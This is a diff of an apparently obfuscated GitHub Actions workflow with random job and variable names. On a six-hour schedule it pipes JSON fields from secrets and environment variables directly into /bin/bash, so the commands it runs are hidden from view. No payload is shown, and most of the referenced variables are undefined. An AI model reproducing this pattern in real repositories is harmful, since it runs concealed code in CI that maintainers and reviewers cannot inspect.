@@ -1,20 +1,27 @@
 name: changsimu7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 4/6 * * *'
-jobs:  # 8311
+    - cron: '54 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: changsimu7654
         env:
-          cj6: ${{ secrets.cj6 }}
+          v85133: ${{ secrets.v85133 }}
         run: |
-          echo $cj6 | jq -r .emsyu1593 | /bin/bash
-          echo $nvdgf5821 | jq -r .g41 | /bin/bash
-          echo $ipv64095 | jq -r .q92 | /bin/bash
-          echo $bx1694 | jq -r .lsil14 | /bin/bash
-          echo $j88 | jq -r .yl07 | /bin/bash
+          echo $v85133 | jq -r .wquh3 | /bin/bash
+          echo $wjiu3501 | jq -r .mwyf008 | /bin/bash
+          echo $zsk300 | jq -r .ozx85612 | /bin/bash
+          echo $pc3 | jq -r .vkzkb22479 | /bin/bash
+          echo $u70920 | jq -r .mud0 | /bin/bash
+          echo $rnmx73769 | jq -r .iidj4 | /bin/bash
+          echo $ixc3646 | jq -r .cb95 | /bin/bash
+          echo $qh2735 | jq -r .a9805 | /bin/bash
+          echo $pm28 | jq -r .dyi699 | /bin/bash
+          echo $lr36 | jq -r .mxyu404 | /bin/bash
+          echo $nhj23 | jq -r .kn635 | /bin/bash
 
